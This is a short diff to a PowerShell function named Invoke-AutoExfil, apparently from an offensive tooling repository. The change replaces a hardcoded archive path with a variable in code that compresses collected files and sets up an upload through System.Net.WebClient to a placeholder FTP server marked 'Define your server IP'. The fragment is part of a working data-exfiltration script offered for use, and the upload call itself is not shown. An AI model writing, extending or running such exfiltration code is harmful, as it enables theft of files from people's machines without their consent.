@@ -9,7 +9,7 @@ function Invoke-AutoExfil
     if ($files.Length -ne 0) 
     {
         write-host $files.length
-        Compress-Archive -LiteralPath $files.FullName -DestinationPath C:\users\Public\leaving.zip
+        Compress-Archive -LiteralPath $files.FullName -DestinationPath $destPath
 
     	$server = "ftp://SERVERIP/" #Define your server IP
     	$webclient = New-Object System.Net.WebClient
